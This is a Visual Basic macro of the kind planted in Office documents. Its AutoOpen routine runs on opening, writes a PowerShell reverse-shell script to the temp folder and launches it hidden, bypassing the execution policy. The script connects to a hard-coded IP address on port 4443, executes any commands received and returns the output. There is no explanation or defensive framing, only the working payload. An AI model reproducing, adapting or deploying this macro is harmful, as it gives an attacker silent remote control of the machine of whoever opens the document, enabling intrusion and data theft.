Sub AutoOpen()
    ' Define the PowerShell script as a string
    Dim psScript As String
    Dim scriptPath As String
    Dim cmd As String
    
    ' Define your PowerShell script
    psScript = "Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('152.67.5.89',4443));" & vbCrLf & _
               "Set-Variable -Name stream -Value ($client.GetStream());" & vbCrLf & _
               "[byte[]]$bytes = 0..65535|%{0};" & vbCrLf & _
               "while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0) {" & vbCrLf & _
               "    Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));" & vbCrLf & _
               "    Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );" & vbCrLf & _
               "    Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');" & vbCrLf & _
               "    Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));" & vbCrLf & _
               "    $stream.Write($sendbyte,0,$sendbyte.Length);" & vbCrLf & _
               "    $stream.Flush();" & vbCrLf & _
               "}" & vbCrLf & _
               "$client.Close();"

    ' Create a temporary PowerShell script file
    scriptPath = Environ("TEMP") & "\MyScript.ps1"
    Open scriptPath For Output As #1
    Print #1, psScript
    Close #1

    ' Build the command to run PowerShell with hidden window
    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & scriptPath & """"

    ' Execute the command with hidden PowerShell window
    Call Shell(cmd, vbHide)
End Sub
